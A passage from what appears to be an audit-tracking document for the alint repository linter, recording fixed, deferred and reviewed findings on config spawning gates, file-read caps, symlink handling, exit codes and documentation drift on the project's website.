  A flag the user wrote (`--check`, `--file={path}`) is left untouched. Test
  added; the sibling spawning kinds don't render paths into argv.
- `[x]` **L14** (decision: document + consider warn) Documented the empty /
  exclude-only `paths` = match-all (fail-open) behavior authoritatively on the
  `Scope` type + `matches` (the spec sites): an explicit `paths: []` applies to
  the whole tree, not nothing. The exclude-only idiom (`["!vendor/**"]`) is
  *intentionally* fail-open, so a load-time warning must target only the
  truly-empty case — that needs an absent-vs-`[]` signal at the spec layer + a
  load-warning channel the loader doesn't expose yet, so it's a tracked
  follow-up (considered, deferred with reason).

Dogfooding (Dog):

- `[x]` **Dog1** `.alint.yml` exercised no cross-file, structured-query, or
  git-hygiene rules — the flagship families. **Done:** added a representative
  slice, each asserting something genuinely true of this repo (verified by
  negative-testing that every one *fires* when its assertion is broken):
  **structured-query** across all three formats — `toml_path_equals`
  (`$.workspace.resolver == "3"`), `json_path_equals` (the VS Code extension's
  `$.publisher`), `yaml_path_equals` (`action.yml` `$.runs.using == composite`);
  **cross-file** — `registry_paths_resolve` asserting every `[workspace]
  members` entry resolves to a real directory (10 members); **git-hygiene** —
  `git_no_denied_paths` forbidding secret-shaped tracked files (bare patterns,
  exercising the M5 any-depth anchoring). Exercised kinds 27 → 32; the dogfood
  stays fully green (46/46). Not extending `monorepo/cargo-workspace` wholesale:
  its `member-has-readme` rule would warn on all 9 crates (no per-crate READMEs
  yet) — a separate quality call, left as a follow-up.
- `[x]` **Dog2** two files exceeded `rust-file-max-lines`. **Done (split, no
  logic change):** `alint-dsl/src/lib.rs` (2335, mostly a ~1500-line test
  module) → its test module moved to `alint-dsl/src/tests.rs`, leaving lib.rs
  at 836. `xtask/src/docs_export.rs` (2131, mostly code) → the ~213-line test
  module to `docs_export/tests.rs` **and** the self-contained ~180-line
  drift-gate count parsers to `docs_export/counts.rs` (the 5 `count_canonical_*`
  entry points `pub(super)`, `write_manifest` calls them qualified), leaving
  docs_export.rs at 1738. Verified: all crate tests pass, fmt + clippy clean,
  **the dogfood is now fully green** (`✓ All 41 rule(s) passed`, no warnings),
  and `docs-export` still emits the correct manifest counts (89/22/11/8/12).

---

## Phase 7 — alint.org drift (site repo)

Tracked here for a single source of truth; lives in the alint.org repo.
**Landed** on branch `audit/post-v0.13-drift` (separate repo, not pushed):
W1–W5 + W7 — `npm run build` (200 pages), `check-version-pins.sh`, and
`check-internal-links.mjs` all green. Notable judgment calls: W1 used the
repo's own `{alint.rulesets}` interpolation + an explicit gate pin (the
"widen the matcher" idea false-positived on `2. Bundled …` list markers
and `ruleset (15 rules)`); W4 mapped `cross_file_value_equals` →
`cross_file.rs` per the registry (not `structured_path.rs`). The agent also
noted the docs-bundle `subcommands=10` vs facts.json `11` — that's correct
(`baseline` is the 11th and ships in v0.14, so the v0.13.0-tag bundle shows
10); no action.

- `[x]` **W1** `src/pages/compare.astro:204` bundled-ruleset count "21" →
  22 (facts.json). Also widen the count gate so it catches noun-before-
  digit table headers (`extract_counts_near_noun` is case-sensitive,
  digit-then-noun only).
- `[x]` **W2** `src/content/blog/introducing-alint.md:116` "The current
  release is v0.11" → v0.13.0; teach the bumper/gate the "current
  release" phrasing (currently only "latest release" is anchored).
- `[x]` **W3** `src/pages/api/rulesets.json.ts:29` regex omits `apache`
  → `apache/governance` emits a non-resolvable URI + 404 source link. Add
  `apache` to `NESTED_PREFIX_RE`.
- `[x]` **W4** `src/pages/api/rules.json.ts:148` `sourceUrlOf` 404s for
  19/89 kinds (aliases + shared-file structured-query kinds). Map aliases
  and shared files to their real source path.
- `[x]` **W5** `.gitignore` omits the synced `src/content/docs/docs/
  reference/` dir (untracked after every sync; a stray `git add -A` would
  commit regeneratable files). Add it next to the other synced subtrees.
- `[~]` **W6** Drift-gate blind spots: no coverage for families /
  case-study / examples counts; "current release" phrasing; API
  endpoints; and `deploy.yml` doesn't run the gates (merge-only). Add
  guards or document the residual risk in marketing/STATE.md. **Partial:**
  the "current release" anchor (W2) and the compare-row pin (W1) are now
  covered; the families/case-study/examples count gates, the API-endpoint
  gate, and the deploy-time gating remain. Tracked.
- `[x]` **W7** Case studies are point-in-time (alint v0.9.17, "future
  tense" for now-shipped kinds). Add a visible "as of vX" banner or a
  revalidation note so they don't read as current-catalogue claims.

---

## Themes / root causes

1. **Spawn gate enumerates at one pre-expansion choke point.** *Four*
   bypasses to date (`gff`, templates, nested, and the `require:` block of
   `for_each_*`/`every_matching_has` — the last found in pre-merge review:
   a nested rule spec buried in a parent rule's options, which a top-level
   *or* post-`finalize` scan both miss). The fix had to scan the raw rule
   mappings recursively, before instantiation. Lesson: a spawning kind can
   hide anywhere a rule spec can nest (templates, nested configs, `require:`
   options); the gate must walk every such site, not just top-level
   `rules[].kind`. Prefer a capability check that can't be routed around
   over an ever-growing enumerate-and-reject list.
2. **Lexical-only confinement + symlink-following reads.** `pathsafe` is
   lexical by design but several callers do real reads through the
   joined path, and the walker's index-pruning doesn't cover the
   direct-read rules. Confinement claims must be scoped to what the FS
   layer actually enforces.
3. **"Fail loudly" has systematic silent-swallow gaps.** Non-UTF-8 git
   collapse, `fs::read` error swallowing, `--baseline` ignored off
   `check`, `--config` dropped, `--format` positional bypass. A pass to
   make each of these surface an error.
4. **Untrusted-input encoding.** Latin-1 `when:` literals, ASCII-only
   case folding, byte-slice panic, incomplete unicode-control sets — a
   recurring "we treated bytes as ASCII" class.
5. **Drift gates have blind spots.** Both repos' generated-contract gates
   are good but miss specific phrasings/layouts (capitalized nouns,
   "current release", families count, API endpoints). Widen the matchers
   and add the missing count anchors.

---

## What's verified solid (do not re-investigate)

SRI mandatory for remote extends; `http://` + nested-remote-extends
rejected; billion-laughs/alias-bombs capped by serde_yaml_ng; no `sh -c`
anywhere; XXE/`$ref`-SSRF closed (`allow_dtd:false`, no http retriever);
baseline `schema_version` gating, count-summing, regeneration guard and
SARIF mark-not-remove all sound; the per-kind `baseline_key`
disambiguation + collision-invariant test hold; bundled-ruleset chain (22
files ↔ facts.json ↔ 22 doc pages ↔ e2e) fully consistent and
CI-enforced; every `gen-X --check` artifact gated *and* LF-pinned;
Dockerfile distroless/nonroot; all six facts.json counts match code;
walker symlink index-pruning + determinism correct; github/junit output
escaping correct; the Kani confinement proof is a real proof (of the
lexical policy). The roxmltree 0.20 pin is load-bearing — do not bump.

---

## Open decisions

1. **H4 `--config`:** fail-loud on multiple `-c` (chosen) vs implement
   last-wins/layered merge. Chosen the conservative fail-loud; flag for
   asamarts if layered configs are wanted.
2. **M11 exit codes:** implement a distinct `3` (internal) vs document
   the real 2-code contract. Leaning *document* (a 2/3 split is a public
   contract change; low value). Confirm.
3. **M14 baseline keying:** doc-only disclosure vs also switch
   `line_max_width`/`file_content_forbidden` to a path key. Leaning
   doc + keep keys (the churn is fail-closed). Confirm.

---

## Post-audit review (#110, M-cluster)

Four independent adversarial reviewers + a first-principles pass audited the
M-cluster PR (M3/M4/M11/M13). Real findings were fixed in the same PR; the
rest are recorded here.

**Fixed in review:**
- **rustdoc private-intra-doc-link** — `read_capped_or_skip`'s doc linked the
  `pub(crate)` `read_or_skip`; failed the `-D warnings` `Docs` job (which
  bypasses check/clippy). Delinked. (The `cargo doc` preflight gap again.)
- **M3-F1 (HIGH) — the "all read sites bounded" claim was incomplete.** The
  four content rules (`file_content_forbidden`, `file_content_matches`,
  `file_header`, `file_footer`) each have a *standalone* `evaluate()` with a
  raw `std::fs::read`, reachable via `for_each_*` nesting when the nested rule
  isn't a single literal (`for_each_dir.rs:375` → `nested_rule.evaluate(ctx)`)
  — the exact OOM M3 set out to close. All four now read via `io::read_capped`,
  skipping an over-cap file to match the engine batch (same rule, same outcome
  nested or top-level).
- **M4 test under-verified** — the dir-symlink test used `.any()`; tightened to
  `assert_eq!(v.len(), 1)` + the path, proving the regular dir and the
  descended child are *not* flagged.
- **M11-F1 — `validate-config` violated the 2/3 contract.** It routed all load
  errors to exit `1` ("Config invalid"), so an internal error there exited 1,
  not 3. `emit_validate_failure` now returns 3 for an internal error.
- **M11-F3/F4 docs** — `Error::Internal`'s doc no longer claims untagged
  "serialization" sites; its Display restores "please file an issue" (exit 3 is
  a returned error, so the panic hook's issue URL doesn't fire).
- **M13 test coverage** — added `validate-config` to the systematic
  `cli_consistency` format matrix (was only a single-format trycmd).
- **Doc accuracy** — `io.rs` cap doc now states the over-cap outcome varies by
  site (violation vs skip); M13 wording corrected (the *subcommand*-position
  flag is rejected by clap's `PossibleValuesParser`, only the *global* position
  needs the handler gate; `fix` still silently falls back sarif→human — a
  pre-existing, separately-decidable behavior, now disclosed not hand-waved;
  `main.rs` was already >2000 lines at M11, so the split isn't solely M13's).

**Design decisions recorded (not bugs):**
- **M3-F3 fail-open skip.** Over-cap files are *skipped* (fail-open) on the
  engine/rule/content-rule paths — a linter leaves an un-analyzable file
  un-analyzed rather than failing the build — vs the *violation* (fail-closed)
  the cross-file/`for_each`-literal paths emit. The `alint-core` loops `warn`;
  the `alint-rules` paths skip silently (no `tracing` dep). A security-relevant
  residual (a secret inside a >256 MiB file evades a content scan) — accepted,
  observable via `-v` on the core paths.

**Deferred with corrected framing:**
- **M4 escaping symlinks** — the review showed a *simpler* safe path than the
  "read-path redesign" I first described: record escaping symlinks in a
  **side-list** on `FileIndex` (kept out of `entries`, so no content rule can
  `root.join()` through them), populated by the `filter_entry` prune;
  `no_symlinks` consults it. No read-path change. Still deferred (a walker +
  `FileIndex` + determinism-sort change), but tractable — a good next item.
- **M3-F2 (TOCTOU)** — the size gate uses the walk-time index size, then does an
  unbounded read; a file that grows past the cap between walk and read defeats
  it. Narrow (needs concurrent growth mid-run); a static checkout is safe.
- **M3-F7** — `generated_file_fresh.rs:300,436` have two uncapped whole-file
  reads (its other reads use `read_capped`); a spawning kind, gated, out of
  M3's stated scope but worth capping for consistency.

**Adversarially verified NOT bugs:** symlink cap-bypass (index records the
*target* size — probed), `--fix` on a dir symlink (`remove_file` unlinks the
link node, no data loss), M4 determinism (entries are path-sorted), M11
misclassification (only alint-controlled bundled bytes reach the `Internal`
sites; a user's bad `extends:` URL stays `Other`/exit 2), the chain-search
classifier, the exhaustive-match fallout of the new variant, the byte-identical
`main.rs`→`tests.rs` move, and that no `status.code = 2` snapshot flips to 3.
